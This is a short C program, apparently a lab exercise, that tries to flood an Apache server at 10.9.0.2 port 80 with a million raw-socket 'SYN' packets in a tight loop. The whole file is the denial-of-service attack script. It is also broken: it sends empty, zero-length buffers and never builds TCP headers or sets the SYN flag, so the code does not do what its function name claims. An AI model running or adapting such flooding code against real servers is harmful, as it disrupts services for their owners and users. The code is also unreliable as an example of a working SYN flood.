#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <unistd.h>
#include <time.h>

void send_syn_packets(int sock, struct sockaddr_in *target) {
    for (int i = 1; i < 101; i++) {
        for (int p = 1; p < 10001; p++) {
            clock_t start = clock();
            sendto(sock, NULL, 0, 0, (struct sockaddr *) target, sizeof(*target));
            clock_t end = clock();
            double time_spent = (double)(end - start) / CLOCKS_PER_SEC;
            printf("Packet %d.%d sent in %f seconds\n", i, p, time_spent);
            usleep(1);
        }
    }
}

int main() {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("Socket error");
        exit(1);
    }
    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(80);
    target.sin_addr.s_addr = inet_addr("10.9.0.2");  // Target Apache server IP

    send_syn_packets(sock, &target);

    close(sock);
    return 0;
}
